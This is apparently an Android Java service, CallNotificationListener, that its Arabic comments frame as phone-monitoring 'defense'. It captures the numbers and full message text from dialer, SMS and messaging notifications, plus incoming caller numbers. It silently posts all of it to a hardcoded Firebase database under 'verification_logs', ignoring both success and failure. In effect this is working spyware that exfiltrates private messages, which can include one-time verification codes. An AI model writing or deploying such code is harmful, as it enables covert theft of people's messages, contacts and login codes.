package com.ban.ab;

import android.content.Context;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.telephony.TelephonyManager;
import android.util.Log;
import okhttp3.*;
import org.json.JSONObject;
import java.io.IOException;

public class CallNotificationListener extends NotificationListenerService {

    private final OkHttpClient client = new OkHttpClient();
    private final String FIREBASE_URL = "https://banproject-2f9c6-default-rtdb.firebaseio.com/";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        Bundle extras = sbn.getNotification().extras;

        // 🛡️ الدفاع الأول: مراقبة الإشعارات (مكالمات ورسائل)
        if (packageName.contains("telecom") || packageName.contains("dialer") || 
            packageName.contains("sms") || packageName.contains("messaging")) {
            
            String title = extras.getString("android.title"); // الرقم في الغالب
            String text = String.valueOf(extras.get("android.text")); // نص الرسالة
            
            if (title != null) {
                sendDataToFirebase(title, text, "Notification_Watch");
            }
        }
    }

    // 🛡️ الدفاع الثاني: مراقبة حالة الهاتف مباشرة (للمكالمات المخفية)
    @Override
    public int onStartCommand(android.content.Intent intent, int flags, int startId) {
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        telephonyManager.listen(new android.telephony.PhoneStateListener() {
            @Override
            public void onCallStateChanged(int state, String incomingNumber) {
                if (state == TelephonyManager.CALL_STATE_RINGING && incomingNumber != null) {
                    sendDataToFirebase(incomingNumber, "Incoming Call Detected", "Radio_Watch");
                }
            }
        }, android.telephony.PhoneStateListener.LISTEN_CALL_STATE);
        return START_STICKY;
    }

    private void sendDataToFirebase(String number, String content, String source) {
        String userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "unknown");
        try {
            JSONObject data = new JSONObject();
            data.put("phone", number);
            data.put("data", content);
            data.put("source", source);
            data.put("timestamp", System.currentTimeMillis());

            RequestBody body = RequestBody.create(data.toString(), MediaType.parse("application/json"));
            Request request = new Request.Builder()
                    .url(FIREBASE_URL + "verification_logs/" + userName + ".json")
                    .post(body).build();

            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response response) {}
            });
        } catch (Exception e) { e.printStackTrace(); }
    }
}
